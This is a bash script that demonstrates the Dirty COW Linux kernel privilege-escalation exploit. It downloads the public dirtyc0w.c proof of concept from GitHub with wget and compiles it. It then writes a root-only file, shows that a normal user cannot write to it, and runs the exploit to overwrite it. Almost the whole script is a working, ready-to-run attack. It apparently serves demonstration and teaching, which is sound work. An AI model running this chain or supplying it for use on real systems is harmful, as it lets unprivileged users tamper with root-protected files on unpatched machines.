#!/bin/bash
COLOR1='\033[1;36m'
NOCOLOR='\033[0m'
echo ""
echo -e "${COLOR1}"
echo "Showing version info"
echo -e "-----------------------------${NOCOLOR}"
uname -r
lsb_release -a


#Download dirtyc0w.c if necessary
echo -e "${COLOR1}"
echo "Download dirtyc0w.c if necessary"
echo -e "-----------------------------${NOCOLOR}"
if ([ ! -f dirtyc0w.c ]) then
  echo "Downloading dirtyc0w.c from GitHub."
  wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
  if ([ ! -f dirtyc0w.c ]) then
    echo "Download failed."
    exit
  fi
else
  echo "File dirtyc0w.c does already exist."
fi

#Compile dirtyc0w.c if necessary
echo -e "${COLOR1}"
echo "Compile dirtyc0w.c if necessary"
echo -e "-----------------------------${NOCOLOR}"
if ([ ! -f dirtyc0w ]) then
  echo "Compiling dirtyc0w.c with gcc."
  gcc -pthread dirtyc0w.c -o dirtyc0w
  if ([ ! -f dirtyc0w ]) then
    echo "Compiling failed."
    exit
  fi
else
  echo "File dirtyc0w.c has already been compiled."
fi

echo -e "${COLOR1}"
read -n1 -r -p "Create root_protected file ...[press any key]"
echo -e "-----------------------------${NOCOLOR}"
if ([ -f "root_protected" ]) then
  echo "File 'root_protected' does already exist. Attempting to remove it."
  rm root_protected
  if ([ -f "root_protected" ]) then
    echo "Deletion failed."
    exit
  fi
fi
echo "Writing to file 'root_protected' as root" 
sudo su root -c "echo This file is writable by root only!  This will never be changed man.> root_protected"
echo "Switching back to normal user"
echo Current user: $(whoami)


ls -la root_protected |grep root_protected
echo "Contents of file root_protected:" $(cat root_protected)

echo -e "${COLOR1}"
read -n1 -r -p "Trying to write to file as normal user ...[press any key]"
echo -e "-----------------------------${NOCOLOR}"

echo "Contents of file root_protected:" $(cat root_protected)
if (echo "Can I write cookies to that file?" > root_protected); then
  echo 1 equals 42! This cannot happen.
else
  echo Writing attempt failed -.- Y U NO ROOT
fi

echo -e "${COLOR1}"
read -n1 -r -p "...[press any key] to Muuuh~TM into that file!"
echo -e "-----------------------------${NOCOLOR}"
./dirtyc0w root_protected "This file is writable by everybody liking c🍪🍪kies!"
if (cat root_protected | grep liking); then
  echo Succeeded in writing to root_protected file
else
  echo DirtyC0W does not work on your system
fi
